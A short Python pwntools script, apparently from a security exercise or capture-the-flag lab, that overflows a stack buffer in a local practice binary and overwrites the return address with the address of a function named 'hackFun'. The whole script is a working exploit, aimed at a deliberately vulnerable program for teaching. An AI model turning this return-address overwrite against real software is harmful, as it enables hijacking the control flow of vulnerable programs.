#!/usr/bin/python3
from pwn import *

prog = pwnlib.elf.load('smash_ex.exe')
fun_addr = prog.symbols['hackFun']
print(f"Detected target function address at {fun_addr}")

p = process('./smash_ex.exe')
lines = p.readlines(4)
for line in lines:
  print(line.decode())
# Figure out how far away it is, need that distance + 8
# Create the right packed address
bytes_to_send = b'abcdefgh'*3 + p64(fun_addr, 'little')

p.send(bytes_to_send)
lines = p.readlines(2)
for line in lines:
  print(line.decode())

